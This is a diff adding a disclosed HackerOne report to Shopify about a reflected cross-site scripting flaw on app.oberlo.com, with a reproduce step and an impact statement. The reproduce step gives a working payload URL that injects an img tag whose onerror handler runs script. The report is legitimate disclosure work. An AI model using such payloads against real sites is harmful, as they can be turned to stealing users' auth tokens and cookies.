@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/569241
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/prial261
+ReportedTo:Shopify(shopify)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:28.05.2019 16:12:49
+
+Summary:
+
+Hi team ,
+I found a reflected xss on https://app.oberlo.com domain .
+
+##Reproduce :
+* Visit **https://app.oberlo.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E** in latest version of firefox browser .
+* You will see popup like attacked screenshot : {F485407}
+
+**Tested in Latest version of firefox**
+
+## Impact
+
+As this is a **auth** so this xss can lead to some serious issues like stealing users **auth** token or stealing browser data/cookies .
+
+Best Regards
+**Prial**
